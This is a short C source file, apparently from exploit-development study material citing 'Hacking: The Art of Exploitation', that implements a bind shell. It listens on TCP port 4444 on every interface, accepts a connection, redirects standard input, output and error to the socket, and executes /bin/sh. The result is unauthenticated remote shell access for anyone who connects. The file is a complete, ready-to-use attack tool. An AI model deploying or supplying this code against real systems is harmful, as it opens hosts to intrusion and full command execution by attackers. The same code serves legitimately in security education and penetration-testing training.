//bind_shell.c
//ref: Erickson, J. (2008). Hacking: The Art of Exploitation. San Francisco, CA: No Starch Press.

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{

	int resultfd, sockfd;
	int port = 4444;
	struct sockaddr_in my_addr;

	//Create the socket and set the options
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
        int one = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// bind the address to the socket
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	//listen for connection on the created socket
	listen(sockfd, 0);

	//accept a connection on the socket
	resultfd = accept(sockfd, NULL, NULL);

	//duplicate the file descriptor for: stdin, stdout and stderr
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);

	//execute bin/sh
	execve("/bin/sh", NULL, NULL);

	return 0;
}
